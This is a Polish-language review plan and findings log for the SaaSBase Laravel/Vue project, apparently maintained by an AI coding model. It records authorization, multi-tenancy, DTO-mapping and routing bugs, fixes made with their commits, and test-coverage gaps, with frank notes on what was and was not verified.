# Plan przeglądu SaaSBase (backend + frontend + integracje)

**Data utworzenia:** 2026-07-02
**Model wykonawczy:** Claude Sonnet 5
**Repozytoria:** `jm-sky/saasbase-api` (Laravel/DDD), `jm-sky/saasbase-web` (Vue 3/TS)
**Branch:** `claude/saasbase-project-review-0p5z11`

> Larastan results (2026-07-03 10:07): `./REVIEW_LARASTAN_20260703_1007.md` — all 69 reported issues fixed (2026-07-03, see below).

## Naprawione: Larastan run 2026-07-03 10:07 (69/69 błędów)

Weryfikacja: `php -l` na każdym zmienionym pliku (0 błędów składni) — brak `vendor/`/Dockera w tej sesji, więc nie da się odpalić samego `phpstan`; poprawki zweryfikowane ręcznie przeciw raportowi błąd-po-błędzie (linia raportu ↔ linia w pliku).

- **Wzorzec dominujący (58/69 błędów):** `@phpstan-ignore-next-line` ignoruje tylko *bezpośrednio następną* linię, a w wielolinijkowych łańcuchach metod (`->foo()\n->bar()`) błąd jest zgłaszany na linii z konkretnym wywołaniem (`->bar()`), nie na linii startowej łańcucha — komentarz stał 1-2 linie za wysoko i przestawał działać przy każdej zmianie pliku powyżej (przesunięcie numerów linii). Naprawione przez przesunięcie komentarza bezpośrednio nad właściwą linię w: `ApprovalResolutionService` (3×), `WorkflowMatchingService` (3×), `OrganizationUnit` (3×), `HasIndexQuery.php:59` (`getEloquentBuilder()` — jedna naprawa w traicie usunęła 30 zgłoszeń, po jednym na każdy kontroler który go używa), `ContractorRegistryConfirmationServiceTest` (11× `->with()`), `ProcessContractorRegistryConfirmationJobTest` (3× `->once()`), `FeedControllerTest` (1× `->once()`).
- **`Auth::payload()` (4×, `User.php`, `EnsureTwoFactorVerified.php`, `IsInTenant.php`)** — metoda z guarda JWTAuth, niewidoczna dla PHPStan na bazowej fasadzie `Auth`. Otagowana `@phpstan-ignore-next-line`, zgodnie z istniejącą konwencją w kodzie.
- **Realny (drobny) bug: `HealthController::getSoketi()/getOpenRouter()`** — `$url` przypisywany wewnątrz `try`; jeśli wyjątek poleci przed/podczas przypisania, `$url` byłby niezdefiniowany w bloku `showDetails()` poza try/catch. Naprawione przez `$url = null;` przed blokiem.
- **Realny bug typowania: `HaveAddresses::addresses()/defaultAddress()`** — metody relacji nie miały generycznych adnotacji PHPDoc (`@return MorphMany<Address, $this>` itd.), więc PHPStan nie umiał wywnioskować typu elementu przy `->first()->full_address` w `ExpenseFactory`/`InvoiceFactory` (4+5 błędów). Dodatkowo `Tenant.php` nie miał adnotacji `@property ?Address $defaultAddress`, którą `Contractor.php` już miał — dodana dla spójności.

**Uwaga:** ten fix batch dotyczy wyłącznie PHPStan (statyczna analiza) — nie uruchamiano `php artisan test` w tej sesji (brak Dockera/DB w sandboxie). Wcześniejszy prawdziwy przebieg testów (`REVIEW_LOCAL_QUALITY_RUN/artisan-test.txt`, `phpstan.txt`, 2026-07-03 05:12) był już przejrzany i naprawiony we wcześniejszej części tej sesji (commity `8ed0abd`/`47a0b3c`).

## Kontekst / diagnoza wyjściowa

Projekt pisany w dużej mierze z pomocą AI przez ok. rok, solo, pod presją czasu. Modele sprzed roku
wymagały więcej kontroli człowieka niż obecne — część rzeczy była poprawiana "łata na łacie". Architektura
(DDD/hexagonal, generator `make:domain-model`, PHPStan, PHP-CS-Fixer) jest sensowna i spójna — problem leży
w nierównym dokończeniu funkcji i niskim pokryciu testami (49 plików testów na 969 plików PHP), a nie w
złym wyborze frameworka. Decyzja: **nie przepisujemy od zera**, robimy pełny review każdej domeny i każdej
integracji, żeby zlokalizować i naprawić realne problemy.

## Metodologia

Domena po domenie, w blokach po 3-4 równolegle (subagenty), każda domena dostaje ten sam checklist.
Na końcu osobny etap syntezy — spójność wzorców i przepływów między domenami, którego nie da się złapać
patrząc na jedną domenę naraz. Wyniki każdej fazy zapisywane jako findings (per domena/integracja),
zbiorczo podsumowywane na koniec fazy.

---

## Checklist — domena (backend)

1. **Zgodność z architekturą DDD** — Actions/Controllers/DTOs/Enums/Models/Requests/Resources/Services/Traits, odstępstwa od wzorca
2. **Multi-tenancy** — `TenantScope`/`BelongsToTenant` wszędzie gdzie trzeba; bezpieczeństwo `Tenant::bypassTenant()`
3. **Autoryzacja** — Policy istnieją i są faktycznie egzekwowane (nie tylko zdefiniowane)
4. **Walidacja** — kompletność FormRequests, edge case'y (null, puste stringi, limity, typy)
5. **Integralność danych** — FK, kaskady, unikalność, transakcje
6. **Pokrycie testami** — realne czy pozorne
7. **Ślady "AI na szybko"** — martwy kod, nieużywane importy, sprzeczne konwencje, TODO/FIXME, duplikacja logiki
8. **Zgodność z README** — czy featury `[x]` faktycznie działają end-to-end

## Checklist — integracja (rozszerzony, wyższe ryzyko)

Wszystko z listy domenowej +

9. **Credentiale** — przechowywanie per-tenant, szyfrowanie w spoczynku, brak w logach/exceptions
10. **Odporność na awarię** — timeout/429/5xx zewnętrznego API — retry, fallback, komunikat dla usera
11. **Walidacja odpowiedzi zewnętrznej** — dane z REGON/VIES/KSeF/Stripe walidowane przed zapisem
12. **Idempotencja** — webhooki Stripe, ponowne wysyłki do KSeF
13. **Audytowalność** — log każdej operacji finansowej/prawnej
14. **Zgodność RODO/prawna** — REGON/Biała Lista/KSeF jako systemy rządowe

## Checklist — frontend (dodatkowo do domenowej)

15. **Zgodność kontraktu z API** — typy/serwisy frontendowe zgadzają się z Resources/DTO backendu
16. **Obsługa błędów i stanów ładowania** — czy każdy serwis/store ma spójną obsługę
17. **i18n** — czy teksty faktycznie przechodzą przez `t()`, nie ma hardcoded stringów

---

## Fazy

### Faza 0 — Fundamenty
*Priorytet najwyższy: błąd tu unieważnia poprawność wszystkiego innego.*

- [x] Multi-tenancy: `TenantScope`, `GlobalOrCurrentTenantScope`, `BelongsToTenant`, `Tenant::$BYPASSED_TENANT_ID`
- [x] Bazowe klasy: `BaseModel`, `BaseDataDTO`, `BaseFormRequest`
- [x] Auth (JWT, rejestracja, reset hasła, OAuth Google/GitHub)
- [x] Rights (uprawnienia, role, stanowiska)
- [x] Common (`HasIndexQuery`, `HasActivityLogging`, `HasMediaSignedUrls`)

### Faza 1 — Integracje zewnętrzne
*Najwyższe ryzyko: pieniądze, prawo, bezpieczeństwo.*

- [ ] Billing/Subscription → Stripe
- [ ] Financial → kursy walut, stawki VAT
- [ ] IbanInfo → IBAN API
- [ ] IdentityCheck → REGON, VIES, Biała Lista MF
- [ ] Invoice → KSeF
- [ ] EDoreczenia → e-doręczenia (eDO Post)
- [ ] Expense → Azure Document Intelligence (OCR)
- [ ] Ai → OpenRouter (chat AI)
- [ ] Exchanges → kursy wymiany

### Faza 2 — Domeny biznesowe core

- [ ] Contractors
- [ ] Invoice
- [ ] Expense
- [ ] Products
- [ ] Projects
- [ ] Tenant

### Faza 3 — Systemy wspierające

- [x] Approval (workflow engine)
- [x] Template (szablony faktur, PDF)
- [x] ShareToken
- [x] Feeds
- [x] Chat
- [x] Calendar
- [x] Skills
- [x] Export
- [x] Admin
- [x] Users

### Faza 4 — Frontend (lustro backendu + spójność kontraktu)
*Audyt w `saasbase-web/REVIEW_PLAN.md` — patrz tam po szczegóły.*

- [x] auth, account, tenant
- [x] invoice, expense, product, project, contractor
- [x] financial, identityConfirmation, subscription
- [x] chat, feed, task, tags, skill, comment, invitations
- [x] rights, shared, utils

### Faza 5 — Synteza całości
*Osobny przebieg — wymaga trzymania całego obrazu naraz, nie da się per-domena.*

- [x] Spójność wzorców między domenami — które odstają od konwencji generatora `make:domain-model`
- [x] Przepływy end-to-end: faktura (utworzenie → szablon → PDF → KSeF → płatność)
- [x] Przepływy end-to-end: wydatek (OCR → alokacja → approval → płatność)
- [x] Mapa zależności między domenami (cykliczne/nieoczekiwane sprzężenia)
- [x] Realna mapa pokrycia testami — gdzie są dziury
- [x] Duplikacja logiki między domenami

---

## Follow-upy (poza kolejnością faz — do zrobienia, ale nie teraz)

- [ ] **Code review zmian wprowadzonych przez Claude** (Faza 0 fix + Faza 1 Grupa A fix) — druga para oczu przed mergem, szczególnie: migracja re-szyfrowania `TenantIntegration.credentials` (nieprzetestowana na realnej bazie), poprawność scope'ów `TenantScopedRoles`/`BelongsToBillingCustomerOfUser`, czy nie ma regresji w istniejących testach (jeśli jakieś istnieją dla dotkniętych plików).
- [ ] **Poprawki we froncie (saasbase-web)** wymagane przez fixy backendu:
  - Formularz płatności Stripe musi przejść na Stripe.js/Elements (tokenizacja karty po stronie klienta) i wysyłać `paymentDetails.paymentMethodId` zamiast `cardNumber`/`expiry`/`cvc` — inaczej formularz subskrypcji jest złamany od commitu z Fazy 1 Grupa A.
  - Sprawdzić czy frontend gdzieś zakłada stary kontrakt `RoleController`/`TenantInvitationController` (np. brak obsługi 403 przy braku uprawnień Owner/Admin).

## Status wykonania

| Faza | Status | Data | Notatki |
|------|--------|------|---------|
| 0 — Fundamenty | **Ukończona — WYMAGA PILNEJ NAPRAWY** | 2026-07-02 | 6 critical, 6 high, ~10 medium/low. Wzorzec: autoryzacja nieegzekwowana w kilku miejscach; jeden przeciek tenant-log; multi-tenancy rdzeń OK poza bypassTenant |
| 1 — Integracje | **Ukończona + naprawiona Grupa A** | 2026-07-02 | 14 critical, ~20 high w 9 integracjach. 6/14 critical naprawionych (aktywnie eksploatowalne: Stripe, tenant isolation, plaintext credentials, SSRF, fałszywy status weryfikacji). KSeF/e-Doręczenia (Grupa B, martwy kod) odłożone świadomie. Reszta HIGH/MEDIUM/LOW nienaprawiona |
| 2 — Core biznesowy | **Ukończona + naprawiona Grupa A** + częściowa Grupa B (Projects) 2026-07-03 | 2026-07-02 | 14 critical, ~15 high w 6 domenach. 13/14 critical naprawionych (aktywnie eksploatowalne: IDOR branding/profil/logo tenanta, brak autoryzacji Invoice/Contractors/Products/OrganizationUnit/PositionCategory, brak unikalności numeru faktury, brak walidacji sum finansowych, kasowanie faktury zamiast tokenu, `tenant_id = NULL` na adresach/kontach bankowych). Projects (funkcjonalnie martwe) i Expense allocation/approval (403 dla wszystkich) odłożone jako known-issue Grupa B. **2026-07-03:** Projects/Tasks create + statusy + TaskPolicy naprawione (patrz sekcja findings "sesja 2026-07-03") — Expense allocation/approval nadal 403 dla wszystkich, nienaprawione |
| 3 — Wspierające | **Ukończona + naprawiona Grupa A** | 2026-07-02 | 10 domen, ~12 critical + ~20 high. 12/12 aktywnie eksploatowalnych critical naprawionych: RCE w silniku PDF Puppeteer, publiczny endpoint usera bez autoryzacji (wyciek email/telefonu/daty urodzenia), eksport omijający `$hidden`/relacje + formula injection + brak autoryzacji, cross-tenant leak w Approval (UNIT_ROLE/SYSTEM_PERMISSION/pending-approvals), cross-tenant DM w Chat, Skills bez autoryzacji (cascade DoS), zepsuty CRUD share-tokenów faktur. Reszta HIGH/MEDIUM/LOW (m.in. Projects, Calendar camelCase-crash, brak publicznego endpointu share-tokenu) odłożona jako known-issue |
| 4 — Frontend | **Ukończona (audyt)**, w `saasbase-web/REVIEW_PLAN.md` | 2026-07-02 | 5 grup domen, ~10 critical + ~15 high. Najgorsze: 2FA całkowicie zepsute end-to-end (3 niezależne, kumulujące się bugi), cały dropdown akcji faktury to atrapy UI, brak ogólnego handlera 403 + Accept-Language statyczny (komunikaty backendu zawsze po angielsku), formularz tworzenia projektu strukturalnie niekompletny, zero client-side role-gatingu w całej aplikacji. Audyt odkrył też realny bug backendowy — camelCase/snake_case mismatch w `UpdateInvoiceRequest` z Fazy 2, naprawiony od razu — oraz bug store'u we frontendzie (`DeleteInvoiceAction` czyści całą listę faktur). Fixy frontendowe jeszcze nie zrobione |
| 5 — Synteza | **Ukończona (audyt)** | 2026-07-02 | 4 tory równoległe. Najważniejsze: 9/11 wymiarów alokacji wydatków ma niedziałającą implementację interfejsu (Error przy użyciu), cała architektura reconciliation statusów (Invoice+Expense) to martwy kod, 4 endpointy `GtuCodeController` zawsze zepsute, zero testów dla jakiejkolwiek Policy dodanej w tej sesji, systemowy brak autoryzacji w 6/7 kontrolerów załączników. Kilka nowo znalezionych CRITICAL (camelCase bug w Expense, payment-shape crash) naprawionych od razu w trakcie audytu |

## Findings

*(uzupełniane w trakcie — każda faza dopisuje sekcję z listą problemów, posortowaną wg wagi)*

### Naprawa błędów — sesja 2026-07-03 (Grupa B, batch 1: Projects + routing)

Pierwsza sesja, w której kontener startowany był świadomie minimalnie (`pgsql` + `laravel.test`
z `--no-deps`, bez `rustfs`/`mailpit`/`soketi` — niepotrzebne do `composer larastan`/`artisan test`,
`.env.testing` i tak używa `CACHE_STORE=array`/`QUEUE_CONNECTION=sync`). Każdy batch zweryfikowany
przed commitem: `composer larastan` (bez nowych błędów w dotkniętych plikach — patrz zastrzeżenie
środowiskowe niżej) + `php artisan test` (275 passed / 31 skipped / **0 failed**, w górę z
269 passed / 6 failed z poprzedniego runu udokumentowanego w `REVIEW_LOCAL_QUALITY_RUN.md`).

**Batch 1 — Projects end-to-end + camelCase DTO bug (commit `7a642be`):**

- Naprawiono `POST /projects` (zawsze `TypeError`) — `CreateProjectRequest` nie miał `tenantId`/`ownerId`
  wymaganych przez `ProjectDTO::fromArray()`. Dodano oba pola (`tenantId` przez `mergeTenantId()`,
  `ownerId` domyślnie na zalogowanego usera) + `$this->authorize('create', Project::class)`.
- Naprawiono `POST /tasks` (zawsze `QueryException`) — `TaskController::store()` czytał
  `$request->input('project_id'/'status_id'/'assigned_to_id')` (snake_case, częściowo złe nazwy pól —
  kolumna to `assignee_id`, nie `assigned_to_id`) z surowego requestu zamiast `validated()`. Przepisano
  na `$request->validated()` + `$this->authorize('create', Task::class)`.
- Dodano **`TaskPolicy`** (view/create/update/delete) — `TaskController` wołał `$this->authorize()` na
  nieistniejącej polisie, więc `show/update/destroy` zwracały 403 dla każdego, łącznie z twórcą i
  przypisaną osobą. Zarejestrowano jawnie w `AuthServiceProvider` (razem z już istniejącą, ale też
  jawnie niezarejestrowaną `ProjectPolicy`).
- Naprawiono wzorzec `(array) $dto → Model::create()/update()` (camelCase→snake_case cicho gubione przy
  mass assignment) w **4 plikach**: `AdminContractorController`, `ProjectController`,
  `ProjectStatusController`, `TaskStatusController` — przełączono na `BaseDTO::toDbArray()`, bezpieczny
  wzorzec już używany w `InvoiceTemplateService`/`CreateContractorBankAccount`/`CreateContractorAddress`.
  Bez tego `ProjectStatusController::store()` i `TaskStatusController::store()` traciły `sort_order`
  (NOT NULL, brak defaultu) — rzucały wyjątek DB przy każdym wywołaniu.
- Dodano autoryzację Owner/Admin do `ProjectStatusController`/`TaskStatusController`
  store/update/destroy — wcześniej dowolny member mógł zmieniać statusy współdzielone przez wszystkie
  projekty/taski tenanta.
- `InitializeTenantDefaults::seedDefaultProjectStatuses()`/`seedDefaultTaskStatuses()` były zdefiniowane,
  ale nigdy nie wołane z `execute()` — żaden tenant nie miał statusu do wyboru, więc `POST /projects`
  i `POST /tasks` (nawet po fixie powyżej) nie miały czego wstawić do `statusId`. Dopięto do `execute()`.
- `TenantController::store()` (ręczne dodanie kolejnej firmy) nie wołał w ogóle `InitializeTenantDefaults`
  — dopięto. To ujawniło **kolejny, wcześniej nieobserwowalny bug**: `StoreTenantRequest` nigdy nie
  ustawiał `owner_id` na tworzonym `Tenant`, więc `CreateRootOrganizationUnit::createOwner()`
  (używające `$tenant->owner_id`, nie parametru `$owner`) próbowało wstawić `user_id = NULL` do
  `org_unit_user` (NOT NULL) → 500 na `POST /tenants` w każdym przypadku, gdzie ta ścieżka faktycznie by
  się wykonała. Złapane przez `TenantApiTest` dopiero PO wpięciu `InitializeTenantDefaults` (wcześniej
  test przechodził tylko dlatego, że cała inicjalizacja była martwym kodem). Naprawiono ustawieniem
  `tenantData['owner_id'] = $request->user()->id` przed `Tenant::create()`.

**Batch 2 — routing/kontrolery Feed/Calendar/Product/Contractor (commit `b663762`):**

- `FeedCommentController::destroy()` — trasa `DELETE /feed-comments/{comment}` nie miała segmentu
  `{feed}`, więc route-model-binding tworzył pusty `Feed` (`id === null`) i warunek 404 był zawsze
  prawdziwy — usuwanie komentarzy feedu było **trwale nieosiągalne**, niezależnie od właściciela. Trasa
  zmieniona na `feeds/{feed}/comments/{comment}`; zakomentowany `// TODO: Add authorization` zastąpiony
  realnym sprawdzeniem `Auth::id() === $comment->user_id`.
- `EventController` — dodano `EventPolicy` (view/update/delete) i wpięto `$this->authorize()` do
  show/update/destroy (wcześniej brak jakiejkolwiek autoryzacji, `EventVisibility::PRIVATE` nigdy
  nieegzekwowane). `StoreEventRequest.endAt` miało `after:start_at` (pole nie istnieje przed
  konwersją camelCase→snake_case w `validated()`, więc reguła była no-opem) — poprawiono na
  `after:startAt`. `EventController::store()` przekazywał surowy `$request->attendees` (camelCase)
  do `attendees()->createMany()` wbrew snake_case `$fillable` na `EventAttendee` — **tworzenie eventu
  z uczestnikami zawsze rzucało wyjątek DB**; naprawiono ręcznym mapowaniem kluczy. Dodano
  `exists:users,id` do `attendees.*.attendeeId`.
- `ProductAttachmentsController` — `route()` w index/store/update wołało nieistniejącą nazwę trasy
  (`product.attachments.show` zamiast zarejestrowanej `products.attachments.show`) z błędnym kluczem
  parametru (`attachment` zamiast `{media}`) — **500 przy każdym wywołaniu**. Przepisano na
  `Media $media` route-model-binding (zgodnie z definicją trasy i wzorcem
  `ContractorAttachmentsController`), dodano brakujące `download()`/`preview()` (trasy już na nie
  wskazywały, metod nie było — kolejne dwa zawsze-500 endpointy) i wpięto istniejące, ale nigdzie
  niewywoływane `authorizeMedia()` do show/download/preview/update/destroy.
- `routes/api/contractors.php` — trasy logo miały **DELETE zarejestrowane dwa razy** (`show` i
  `delete`) i żadnego GET; Laravel dopasowywał pierwszą pasującą (`show`), więc `DELETE .../logo`
  faktycznie wołał `show()` (zwracał 200 ze streamowanym obrazem zamiast usuwać) — `delete()` był
  nieosiągalny, a metadanych logo w ogóle nie dało się pobrać przez GET. Poprawiono `show` na GET.

**Zastrzeżenie środowiskowe:** `composer larastan` w tym środowisku zwrócił **93 błędy** (głównie
`ignore.unmatchedLine (non-ignorable)` na `@phpstan-ignore-next-line` w plikach niedotkniętych tą sesją,
plus `Mockery\ExpectationInterface::once()/with()` nierozpoznane w kilku testach) — wyraźny wzrost
względem 3 błędów udokumentowanych w `REVIEW_LOCAL_QUALITY_RUN.md` z 2026-07-02. Żaden z tych błędów
nie dotyczy pliku zmienionego w tej sesji (zweryfikowane grepem po ścieżkach) — wygląda na dryf
wersji Larastan/Mockery-PHPStan-extension w obrazie Docker między sesjami, nie na regresję wprowadzoną
tymi fixami. Nienaprawione świadomie — osobny problem infrastrukturalny, poza zakresem tego batcha.

### Faza 5 — Synteza: spójność wzorców + duplikacja logiki

**Wzorzec:** generator `make:domain-model` sam w sobie jest bezpieczny (nie używa DTO w store/update — woła `$request->validated()` wprost). Bug `(array) $dto → Model::create()` to wzorzec, który deweloperzy dopisywali RĘCZNIE, odchodząc od bezpiecznej konwencji generatora, "żeby użyć DTO tak jak wypada" — im bliżej pozornie "ładniejszego", w pełni DTO-drivenego kodu, tym bliżej bugu. Drugi powtarzający się motyw: 6 z 7 kontrolerów załączników ma identyczny brak autoryzacji obiektowej — to co Faza 2 zgłosiła jako specyfikę Projects/Task okazuje się systemowym wzorcem powtórzonym 6 razy.

- **[CRITICAL — nowy, naprawiony]** `GtuCodeController` — **4 endpointy zawsze zepsute** mimo poprawnej walidacji: `assignToInvoiceLine()`/`assignToProduct()` czytają `$request->input('gtu_code')` zamiast `validated('gtuCode')` (zawsze `null`, kod GTU nigdy się nie przypisuje), `autoAssign()`/`validateAssignment()` czytają `input('invoice_id')` zamiast `validated('invoiceId')` (zawsze `null` → `findOrFail(null)` → zawsze 404, niezależnie od podanej faktury). Odwrotny wariant znanego już wzorca (tu `rules()` jest poprawne, ale kontroler czyta zły klucz przez `input()` zamiast `validated()`).
- **[CRITICAL — potwierdzone, naprawione]** `UpdateExpenseRequest` — dokładnie ten sam bug camelCase/snake_case co `UpdateInvoiceRequest` (już naprawiony), tu wciąż aktywny w momencie audytu. Niezależnie potwierdzone przez ten tor i przez tor przepływu wydatku end-to-end.
- **[HIGH — naprawione 2026-07-03]** `(array) $dto → ::create()/->update()` — pełny grep dał 9 wystąpień w 5 plikach: **`AdminContractorController`** (znane z Fazy 3, traci `tenant_id`/`vat_id`/`tax_id`/`is_active`/`is_buyer`/`is_supplier`), **`ProjectController`** (znane z Fazy 2), **`ProjectStatusController`/`TaskStatusController`** (NOWE — analogicznie tracą `tenant_id`/`sort_order`/`is_default`). `SkillController` okazuje się bezpieczny mimo hipotezy w briefie — jego DTO ma tylko pola jednowyrazowe. Istnieje bezpieczna alternatywa (`BaseDTO::toDbArray()`, snake'uje klucze), używana poprawnie w 4 miejscach (`InvoiceTemplateService`, `CreateContractorBankAccount`, `CreateContractorAddress`) — wszystkie 4 zepsute pliki przełączone na nią.
- **[HIGH — nowy]** Systemowy brak autoryzacji obiektowej w **6 z 7** `*AttachmentsController` (Contractor/Expense/Invoice/Product/Project/Task) — każdy sprawdza tylko integralność (`media.model_id` należy do rekordu), nie czy user ma prawo zarządzać załącznikami TEGO rekordu. Jedyny wyjątek: `TenantAttachmentsController` (poprawnie woła Policy). Faza 2 zgłosiła to tylko dla Projects/Task — ten grep pokazuje że to wzorzec systemowy, nie specyfika jednej domeny. Dwa klastry "niemal identycznych" kontrolerów: Invoice/Expense (znane) i nowo znaleziona para Project/Task (14 linii różnicy na 80).
- **[MEDIUM]** `HasComments`/`HasTags` traity podłączone do 6 modeli (Project/Product/Invoice/Expense/Contractor/Contact), ale trasy/kontrolery istnieją tylko dla 2 (Contractors/Products) — komentowanie/tagowanie faktur/wydatków/projektów architektonicznie przygotowane, całkowicie nieosiągalne przez API. Ten sam wzorzec "szkielet jest, endpoint nie" co Approval CRUD i ShareToken public endpoint (Faza 3).
- **[MEDIUM]** `ContractorTagsController` nie dziedziczy z `Controller` (jedyny taki przypadek w repo) i nie loguje aktywności (w przeciwieństwie do `ProductTagsController`, który to robi poprawnie) — audit trail dla tagów kontrahentów nie istnieje mimo deklaracji w CLAUDE.md.
- **[LOW]** Wzorzec Action używany tylko w 7 z 25+ domen (Tenant/Subscription/Auth/Expense/Contractors/Approval/IdentityCheck) — Invoice/Products/Projects/Skills/Template i większość pozostałych nie mają ani jednej klasy Action, mimo że CLAUDE.md deklaruje to jako kluczowy wzorzec.
- **[LOW]** `HasIndexQuery` używane tylko w 30 z 105 kontrolerów (~29%), `HasActivityLogging` w 31 plikach skoncentrowanych w 5 domenach — reszta implementuje listing/audit ad-hoc.

### Faza 5 — Synteza: dependency map + test coverage map

**Wzorzec:** Financial jest de facto nieformalnym hubem z dwukierunkowym sprzężeniem wobec 4 domen biznesowych naraz; "bazowe" domeny (Common/Auth/Tenant) same importują z 6-9 domen biznesowych, odwracając zamierzony kierunek zależności. Najważniejszy finding: system alokacji wydatków deklaruje 11 wymiarów przez `AllocationDimensionInterface`, ale **tylko 2 z 11 klas docelowych faktycznie implementują interfejs** — dla pozostałych 9 (w tym `User`, `Project`) każde żądanie API z tym wymiarem kończy się `Error: Call to undefined method`, bez żadnego `method_exists()`-owego zabezpieczenia jak w analogicznym buggu z `ApprovalResolutionService` (Faza 3). Ten finding wymagał trzymania w głowie jednocześnie enuma z Expense, README z Expense/Contracts i zawartości 6 różnych domen modelowych — dokładnie dlatego jest to Faza 5, nie per-domena.

**Mapa zależności:**

- **[HIGH]** Prawdziwe cykle między parami domen biznesowych: Financial↔Contractors, Financial↔Expense, Financial↔Invoice (Invoice ma 14 importów z Financial), Financial↔Products, Approval↔Expense, Skills↔Projects, Export↔{Contractors,Expense,Invoice,Products,Projects}.
- **[MEDIUM]** Odwrócony kierunek zależności: Common importuje z 6 domen biznesowych (Contractors/Expense/Invoice/Products/Skills/Users), Auth (`User` model) ma bezpośrednie relacje do Projects/Skills/Subscription/Users, Tenant ma 9+ cross-domain importów (w tym `OrganizationUnit implements Expense\Contracts\AllocationDimensionInterface`).
- **[MEDIUM]** Zaskakujące sprzężenia: `AiChatService` czyta wprost modele `Chat\Models\{ChatMessage,ChatRoom}` zamiast przez interfejs/DTO.
- **[CRITICAL — nowy]** `AllocationDimensionType::getMorphClass()` mapuje 11 typów wymiaru na klasy w 6 domenach (Financial/Tenant/Auth/Projects/Common/Products), ale tylko `AllocationTransactionType` (Financial) i `OrganizationUnit` (Tenant) implementują `AllocationDimensionInterface`. `Expense\Contracts\README.md` **dokumentuje z gotowym przykładem kodu**, że `User`/`Project` powinny implementować ten interfejs — nie implementują. `DimensionItemResource::toArray()` bezwarunkowo woła `getId()/getCode()/getName()/getDescription()/isGlobal()/getDisplayName()/getIsActive()` na załadowanej relacji polimorficznej — dla 9 z 11 wymiarów te metody nie istnieją, `JsonResource::__call` przechodzi wprost do `$this->resource->{$method}()` bez żadnej osłony, więc każda alokacja z wymiarem innym niż TRANSACTION_TYPE/STRUCTURE kończy się `Error`.

**Mapa pokrycia testami:**

- **[CRITICAL]** 49 plików testów na 976 plików PHP w `app/`. **14 z 28 domen ma dosłownie zero efektywnego pokrycia** (Admin, Ai, Billing, Calendar, Chat, EDoreczenia*, Expense-core, Export, IbanInfo, Rights, ShareToken, Subscription, Template, Users) — dokładnie połowa. Kolejne ~11 domen ma pliki testów, ale testują wyłącznie happy-path (Approval, Auth, Common, Contractors, Financial, Invoice, Products, Projects, Skills, Tenant, Feeds).
- **[CRITICAL]** Dominujący wzorzec to nie "brak testów", tylko "złe testy" — trzy potwierdzone przykłady: `ApprovalResolutionServiceSimpleTest` asertuje wyłącznie `method_exists()` (zero asercji behawioralnych, dokładnie tam gdzie siedziały oba CRITICAL z Fazy 3); `ApprovalWorkflowExecutionTest` (11 metod) nigdy nie woła `postJson`/`getJson` — cross-tenant leak żył w warstwie HTTP, poza zasięgiem testu; `Skill{,Category}ApiTest` (14 metod) nie ma ani jednego testu sprawdzającego że user bez roli dostaje 403. Stosunek zero-coverage do ma-testy-złego-typu wśród CRITICAL bugów: ~60/40.
- **[CRITICAL — najważniejszy wniosek syntezy]** `grep -rl "InvoicePolicy\|TenantIntegrationPolicy\|InvoiceTemplatePolicy\|AddressPolicy\|BankAccountPolicy" tests/` → **zero wyników**. Żadna z Policy dodanych/zaostrzonych w tej sesji (Fazy 0-3, ~45-50 fixów CRITICAL/HIGH) nie ma ani jednego testu granicy autoryzacji — nie na poziomie "przechodzi", tylko "istnieje". Jedyna weryfikacja to `php -l` plus jeden przypadkowy pełny run Docker/PHPUnit, który złapał 3 błędy PHPStan + 6 failing testów, ale żaden z tych 6 nie dotyczył nowych Policy. **Największym ryzykiem nie jest już "stary, nienaprawiony bug" — jest nim "świeżo naprawiony bug bez regression-testu": wystarczy jeden nieuważny refaktor/rewert, żeby cicho odtworzyć dokładnie te same dziury, a nic tego nie wyłapie.**

### Faza 5 — Synteza: przepływ end-to-end faktury i wydatku

**Wzorzec wspólny dla obu przepływów:** infrastruktura reconciliation/automatyzacji istnieje na papierze (DTO, Service, Enum ze stanami przejść, cast) ale nigdy nie jest spięta z żadnym realnym punktem wejścia — ten sam motyw co KSeF (Faza 1) i `ApprovalResolutionService` przed fixem (Faza 3), tylko odkryty tu na poziomie całej architektury stanu faktur/wydatków. Drugi powtarzający się wzorzec: rozjazd walidacji między `Store*Request` a `Update*Request` dla tych samych zagnieżdżonych pól (`payment`, `status`) — Store ma silną walidację, Update miał słabą/żadną dla tych samych kluczy, co pozwalało „zbrickować" już istniejący rekord przy pierwszej edycji (naprawione — patrz sekcja fixów niżej).

**Faktura (utworzenie → szablon → PDF → KSeF → płatność):**

- **[HIGH]** Potwierdzone z Fazy 2: `NumberingTemplate::generateNextNumber()` nadal wołane wyłącznie z seedera. `NumberingTemplateController::preview()` to osobna, zduplikowana reimplementacja formatowania numeru, **niespójna** z `generateNextNumber()` (nie obsługuje placeholderów `NNNN`/`YY`) — podgląd numeru w UI może różnić się od tego, co realnie by wygenerował model, gdyby był kiedykolwiek użyty.
- **[HIGH]** `InitializeTenantDefaults` (realnie wołane przy rejestracji) **nigdy nie seeduje `InvoiceTemplate`** dla nowego tenanta — jedyny globalny domyślny szablon powstaje przez jednorazowy `InvoiceTemplatesSeeder`, odspojony od cyklu życia tenanta. Jeśli środowisko powstało przez `migrate` bez pełnego `db:seed`, **każde pobranie PDF faktury dla każdego tenanta rzuca `TemplateNotFoundException`** — fix z Fazy 3 chroni tylko przed mutacją globalnego szablonu, nie przed jego brakiem.
- **[HIGH]** `PuppeteerEngine::applyTemplateSettings()` zawsze zakłada, że `InvoiceTemplate.settings` jest w kształcie mPDF (`orientation: 'P'/'L'`, marginesy jako liczby) i konwertuje przez `convertMpdfToPuppeteerSettings()` — ale Puppeteer (domyślny silnik) ma WŁASNY natywny kształt (`'portrait'/'landscape'`, marginesy jako stringi `'2mm'`). Pole `settings` nie ma żadnego schematu poza `['nullable','array']`. Niedopasowanie kształtu **cicho psuje layout PDF** (orientacja landscape renderuje się jako portret, niestandardowe marginesy są ignorowane) — bez wyjątku, bez logu.
- **[CRITICAL — potwierdzone/poszerzone]** KSeF: zero punktów styku między domeną Invoice a `app/Services/KSeF/*` — brak routes/Controllera/Action/Joba. `TenantIntegrationType::Ksef` istnieje jako opcja w UI integracji tenanta — **tenant może podpiąć credentiale KSeF, walidacja przejdzie, ale nic ich nigdy nie odczyta**. Gorsze niż martwy kod: wygląda jak działająca integracja.
